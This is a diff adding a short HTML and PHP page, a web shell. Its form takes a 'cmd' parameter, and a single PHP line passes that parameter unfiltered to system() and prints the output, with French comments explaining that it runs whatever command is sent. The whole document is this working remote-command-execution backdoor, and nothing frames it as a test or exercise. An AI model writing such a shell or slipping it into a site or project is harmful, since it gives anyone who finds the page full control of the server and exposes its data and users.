@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<form>
+    <input name="cmd" style="width: 100%; padding: 10px;" placeholder="Commande..." autofocus>
+</form>
+
+<pre style="background: #222; color: #fff; padding: 10px;">
+<?php
+    // Si une commande est envoyée, on l'exécute et on affiche tout
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd'] . " 2>&1");
+    }
+?>
+</pre>
